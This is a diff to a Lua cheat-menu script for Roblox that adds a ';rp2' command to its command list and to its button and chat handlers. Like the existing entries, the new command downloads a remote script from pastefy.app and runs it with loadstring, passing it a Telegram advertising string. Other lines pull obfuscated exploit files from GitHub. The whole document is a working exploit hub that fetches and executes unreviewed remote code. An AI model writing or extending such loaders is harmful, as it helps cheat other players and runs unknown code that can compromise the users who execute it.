@@ -197,7 +197,7 @@ local commands = {
     ";avtor", ";gh", ";na2", ";inf", ";na1", ";le", ";tfling", ";fly", ";fly2", ";qcmd",
     ";tfling2", ";bp1", ";bp2", ";bp3", ";tel1", ";tel2", ";glios", ";cmds", ";hth",
     ";zomb", ";knpc", ";jerk", ";punch", ";invis2", ";invis", ";tel3", ";roa", ";akp1", ";akp2",
-    ";prox", ";rochips", ";fc1", ";fc2", ";fc3", ";rp", ";srp", ";srp2", ";tictactoe", ";illus", ";toolgui", ";keyb", ";wibtt", ";acl", ";krunox", ";srp3", ";tptool"
+    ";prox", ";rochips", ";fc1", ";fc2", ";fc3", ";rp", ";rp2", ";srp", ";srp2", ";tictactoe", ";illus", ";toolgui", ";keyb", ";wibtt", ";acl", ";krunox", ";srp3", ";tptool"
 }
 
 executeButton.MouseButton1Click:Connect(function()
@@ -229,6 +229,8 @@ executeButton.MouseButton1Click:Connect(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_11l7Y131YqJjZ31QmV5L8pI23V02b3191sEg26E75472Wl78Vi8870jRv5txZyL1.lua.txt"))()
     elseif codeToExecute == ";hth" then
         loadstring(game:HttpGet('https://pastefy.app/tI5b3OVD/raw'))()
+    elseif codeToExecute == ";rp2" then
+        loadstring(game:HttpGet("https://pastefy.app/hdd1kF9c/raw"))("T.me/AvtorScripts")
     elseif codeToExecute == ";zomb" then
         loadstring(game:HttpGet('https://pastefy.app/w7KnPY70/raw'))()
     elseif codeToExecute == ";rp" then
@@ -439,6 +441,8 @@ cc = game.Players.LocalPlayer.Chatted:Connect(function(msg)
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Infinite-Yield-Reborn-Legacy-21819"))()
     elseif spaceSplit[1] == ";srp3" then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Super-ring-parts-without-massage/refs/heads/main/Super%20ring%20parts"))()
+    elseif spaceSplit[1] == ";rp2" then
+        loadstring(game:HttpGet("https://pastefy.app/hdd1kF9c/raw"))("T.me/AvtorScripts")
     elseif spaceSplit[1] == ";na1" then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Silly-Exploiter/NamedAdmin/main/bamed%20admen.txt"))()
     elseif spaceSplit[1] == ";le" then
